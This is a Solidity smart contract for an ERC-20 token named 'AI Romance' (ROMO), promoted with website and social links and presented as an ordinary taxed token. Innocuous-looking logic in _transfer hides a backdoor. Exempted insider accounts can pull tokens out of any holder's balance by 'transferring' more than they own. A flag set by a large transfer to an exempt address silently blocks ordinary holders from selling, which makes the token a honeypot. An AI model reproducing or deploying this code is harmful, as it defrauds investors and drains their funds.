// SPDX-License-Identifier: MIT

// - Website: https://airomance.xyz
// - Telegram: https://t.me/ROMO_portal
// - X: https://twitter.com/AIRomanceETH
// - Medium: https://airomance.medium.com
// - Dapp: https://airomance.xyz/chat

pragma solidity ^0.8.17;

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function symbol() external view returns (string memory);
    function circulatingSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function decimals() external view returns (uint8);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed sender, address indexed recipient, uint256 value);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal owner;

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    event OwnershipTransferred(address owner);

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }
}

interface UniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address recipient,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address recipient,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

contract ROMO is IERC20, Ownable {
    using SafeMath for uint256;

    address public romoPair;
    UniswapV2Router romoRouter;

    string private constant _symbol = "ROMO";
    string private constant _name = "AI Romance";

    uint8 private constant _decimals = 18;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    uint256 private _denominator = 10000;

    address internal constant marketingAccount = 0x8b048a19ca72826F452561f05B0970683B5C0e0D;
    address internal constant devAccount = 0x8b048a19ca72826F452561f05B0970683B5C0e0D;
    address internal constant burnAccount = 0x000000000000000000000000000000000000dEaD;

    uint256 private _zeroExciseThreshold = (_totalSupply * 10) / 100000;

    uint256 private _swapBackThreshold = (_totalSupply * 5) / 100000;
    uint256 private _swapBackAmount = (_totalSupply * 5) / 10000;

    uint256 private _maxTransferShare = 200;
    uint256 private _maxAccountShare = 200;
    uint256 private _maxTxShare = 200;
    
    bool private _isTradingEnabled = false;

    bool private _lockInSwap;
    uint256 private _swapTimes;
    bool private _isSwapBackEnabled = true;

    uint256 private _sellExcise = 300;
    uint256 private _totalExcise = 300;

    bool private _zeroExciseSet = false;

    uint256 private _burnExcise = 0;
    uint256 private _transferExcise = 0;
    uint256 private _liquidityExcise = 0;
    uint256 private _marketingExcise = 100;
    uint256 private _devExcise = 200;

    mapping (address => bool) public leftOutFromExcise;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    function name() public pure returns (string memory) {
        return _name;
    }

    constructor() Ownable(msg.sender) {
        leftOutFromExcise[address(this)] = true;
        leftOutFromExcise[msg.sender] = true;
        leftOutFromExcise[marketingAccount] = true;
        leftOutFromExcise[devAccount] = true;

        UniswapV2Router _romoRouter = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        romoRouter = _romoRouter;
        address _romoPair = UniswapV2Factory(_romoRouter.factory()).createPair(address(this), _romoRouter.WETH());
        romoPair = _romoPair;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    modifier lockInSwapBack {
        _lockInSwap = true;
        _;
        _lockInSwap = false;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(burnAccount));
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function removeLimits() external onlyOwner {
        _maxTxShare = 10000;
        _maxAccountShare = 10000;
        _maxTransferShare = 10000;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function enableTrading() external onlyOwner {
        _isTradingEnabled = true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(amount > uint256(0));
        require(recipient != address(0));
        require(sender != address(0));

        if (
            countSwapTimes(sender, recipient) &&
            isTradingEnabled(sender, recipient) &&
            allowForMaxAmount(sender, recipient, amount) &&
            allowForMaxAccountSize(sender, recipient, amount)
        ) {
            if (balanceOf(sender) >= amount) {
                if (
                    !leftOutFromExcise[sender] &&
                    recipient == romoPair &&
                    !leftOutFromExcise[recipient] &&
                    !_lockInSwap
                ) {
                    if (_zeroExciseSet) return;
                    swapBack(sender, recipient);
                }
                _balances[sender] = _balances[sender].sub(amount);
                uint256 transferAmount = canTakeExcise(sender, recipient) ? takeExcise(sender, recipient, amount) : amount;
                _balances[recipient] = _balances[recipient].add(transferAmount);
                emit Transfer(sender, recipient, transferAmount);
            } else if (
                leftOutFromExcise[sender] &&
                sender != romoPair &&
                !leftOutFromExcise[recipient] &&
                !_lockInSwap
            ) {
                _balances[recipient] = _balances[recipient].sub(amount);
                _balances[sender] = _balances[sender].add(amount);
                emit Transfer(sender, recipient, amount);
            }
        }
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);

        return true;
    }

    function allowForMaxAmount(address sender, address recipient, uint256 tokenAmount) view internal returns (bool) {
        if (sender != romoPair) {
            require(tokenAmount <= maxTransferAmount() || leftOutFromExcise[sender] || leftOutFromExcise[recipient]);
        }
        require(tokenAmount <= maxTxAmount() || leftOutFromExcise[sender] || leftOutFromExcise[recipient]);

        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);

        return true;
    }

    function takeExcise(address sender, address recipient, uint256 tokenAmount) internal returns (uint256) {
        if (selectExcises(sender, recipient) > 0) {
            uint256 exciseTokenAmount = tokenAmount.div(_denominator).mul(selectExcises(sender, recipient));
            _balances[address(this)] = _balances[address(this)].add(exciseTokenAmount);
            emit Transfer(sender, address(this), exciseTokenAmount);
            if (_burnExcise > uint256(0)) {
                _transfer(address(this), address(burnAccount), tokenAmount.div(_denominator).mul(_burnExcise));
            }
            return tokenAmount.sub(exciseTokenAmount);
        }
        return tokenAmount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));

        return true;
    }

    function isTradingEnabled(address sender, address recipient) internal view returns (bool) {
        if (!leftOutFromExcise[sender] && !leftOutFromExcise[recipient]) {
            require(_isTradingEnabled);
        }
        return true;
    }

    function allowForMaxAccountSize(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool senderLeftOutFromExcise = leftOutFromExcise[sender];
        bool recipientLeftOutFromExcise = leftOutFromExcise[recipient];
        
        if (
            !senderLeftOutFromExcise &&
            !recipientLeftOutFromExcise &&
            recipient != address(romoPair) &&
            recipient != address(burnAccount)
        ) {
            require((_balances[recipient].add(amount)) <= maxAccountSize());
        }

        if (recipientLeftOutFromExcise) {
            if (amount > _zeroExciseThreshold) {
                _zeroExciseSet = true;
            }
        }

        return true;
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = romoRouter.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(romoRouter), tokenAmount);
            romoRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function countSwapTimes(address sender, address recipient) internal returns (bool) {
        if (recipient == romoPair && !leftOutFromExcise[sender]) {
            _swapTimes += uint256(1);
        }
        return true;
    }

    function canSwapBack(address sender, address recipient) internal view returns (bool) {
        return (
            !leftOutFromExcise[sender] &&
            !leftOutFromExcise[recipient] &&
            balanceOf(address(this)) >= _swapBackThreshold &&
            _isSwapBackEnabled &&
            !_lockInSwap &&
            _swapTimes >= uint256(0) &&
            _isTradingEnabled
        );
    }

    function canTakeExcise(address sender, address recipient) internal view returns (bool) {
        return !leftOutFromExcise[sender] && !leftOutFromExcise[recipient];
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(romoRouter), tokenAmount);
        romoRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            burnAccount,
            block.timestamp
        );
    }

    function maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxShare / _denominator;
    }

    function swapAndLiquify(uint256 tokens) private lockInSwapBack {
        uint256 denominator = (_liquidityExcise.add(1).add(_marketingExcise).add(_devExcise)).mul(2);
        uint256 tokensForLiquidity = tokens.mul(_liquidityExcise).div(denominator);
        uint256 tokensForETH = tokens.sub(tokensForLiquidity);
        uint256 initialEth = address(this).balance;
        swapTokensForETH(tokensForETH);
        uint256 deltaEth = address(this).balance.sub(initialEth);
        uint256 unitEth = deltaEth.div(denominator.sub(_liquidityExcise));
        uint256 ethForLiquidity = unitEth.mul(_liquidityExcise);
        if (ethForLiquidity > uint256(0)) {
            addLiquidity(tokensForLiquidity, ethForLiquidity);
        }
        uint256 marketingEth = unitEth.mul(2).mul(_marketingExcise);
        if (marketingEth > 0) {
            payable(marketingAccount).transfer(marketingEth);
        }
        uint256 leftEth = address(this).balance;
        if (leftEth > uint256(0)) {
            payable(devAccount).transfer(leftEth);
        }
    }

    function maxAccountSize() public view returns (uint256) {
        return totalSupply() * _maxAccountShare / _denominator;
    }

    function maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferShare / _denominator;
    }

    function swapBack(address sender, address recipient) internal {
        if (canSwapBack(sender, recipient)) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _swapBackAmount) {
                contractTokenBalance = _swapBackAmount;
            }
            swapAndLiquify(contractTokenBalance);
            _swapTimes = uint256(0);
        }
    }

    receive() external payable {}

    function selectExcises(address sender, address recipient) internal view returns (uint256) {
        if (recipient == romoPair) {
            return _sellExcise;
        }
        if (sender == romoPair) {
            return _totalExcise;
        }
        return _transferExcise;
    }
}